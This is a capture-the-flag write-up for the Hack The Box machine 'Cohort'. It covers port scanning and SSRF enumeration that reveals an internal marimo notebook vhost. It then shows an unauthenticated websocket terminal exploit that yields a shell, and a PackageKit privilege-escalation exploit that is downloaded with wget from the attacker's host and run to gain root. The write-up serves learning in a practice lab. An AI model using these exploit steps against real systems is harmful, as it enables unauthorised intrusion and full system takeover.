# COHORT-HTB
Needs reviewing of the concepts
Initial nmap report:

```bash
└─$ nmap -T4 --min-rate 1000  -p- 10.129.20.51
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 17:35 -0300
Warning: 10.129.20.51 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.20.51
Host is up (0.48s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 126.36 seconds
```

A more complete scan does not reveal anything very important at any of the open ports.

```bash
└─$ sudo nmap -A -sC -p22,80,443 cohort.htb                        
[sudo] password for spaz: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-06 17:38 -0300
Nmap scan report for cohort.htb (10.129.20.51)
Host is up (0.36s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
|_http-title: Cohort Analytics
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   402.14 ms 10.10.16.1
2   200.79 ms cohort.htb (10.129.20.51)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.46 seconds
```

Port 80 redirects to por 443 (http to https:
<img width="1462" height="672" alt="image" src="https://github.com/user-attachments/assets/6b3a4ec1-54ca-48f8-86f3-c23ab5f046a0" />

CLick on the button that reads "Client Insights"
<img width="1285" height="723" alt="image" src="https://github.com/user-attachments/assets/c4ba5d03-876f-44e1-aa40-f15fd22215b7" />

The key here is that they gave us a way to perform SSRF (Server Side Request Forgery). This can be seem when we get a response when actually going for services that are bound to all interfaces:
<img width="587" height="611" alt="image" src="https://github.com/user-attachments/assets/48c366dc-0777-4e04-b9d0-1e1f6e31872e" />

Now we must enumerate the internal network. There are many possible ports, but we 8888 open serverside.
8888 generally is an alternative to port 80 and 443:
Port 8888 is hosting something called "marimo"

```bash
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>marimo</title>
</head>
<body style="
    background-color: #f4f4f9;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;">
```
If we check for http://0.0.0.0:8888/api/version, we get the answer for 0.20.4. Always check vor the api directories. If we google marimo version 0.20.4 cve we can find this https://github.com/Nxploited/CVE-2026-39987. This CVE can lead to RCE but we cant reach marimo from outside yet.
After exploring some more I found that port http://0.0.0.0:80/status can be acessed:

```bash
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[{"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},{"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}]}
```
There is indeed a vhost: "nb-1be3782a8afd3ad5.cohort.htb" , append it to /etc/hosts and voila, we have access to marimo:
<img width="1235" height="667" alt="image" src="https://github.com/user-attachments/assets/b5fc6e53-d895-410e-98dd-08dd973b13c9" />

Now we can actually use the CVE We found before, just copy and paste exactly as it is written at the CVE page, there is no need to actually use the CVE-2026-39987.py file there since it is only a scanner for the vulnerability.


```bash
# Install websocat
cargo install websocat
```
You might need to append cargo to your PATH.
```bash
export PATH="$PATH:/home/spaz/.cargo/bin"
```
Then you can connect:

```bash
websocat -k "wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws" -H "Authorization: Bearer any-value"
```
And then you have user flag:
<img width="1662" height="190" alt="image" src="https://github.com/user-attachments/assets/822dbd6a-0c21-43ca-ab97-ebfc366ce1cf" />

*Privilege escalation*

After some lenghty system enumeration, we found the PackageKit version: packagekit 1.2.8. If we google this version'll find the CVE-2026-41651 that leads to privesc via TOCTOU.
Very simple to use, just clone this at your machine first:
```bash
git clone https://github.com/0xBlackash/CVE-2026-41651
cd CVE-2026-41651
python -m http.server
```
Then, at marimo:

```bash
wget http://10.10.16.250:8000/CVE-2026-41651.py
chmod +x CVE-2026-41651.py
python3 CVE-2026-41651.py
```

And get root:
<img width="1908" height="312" alt="image" src="https://github.com/user-attachments/assets/3c908829-29b8-44b1-ba09-6f84347bcc89" />






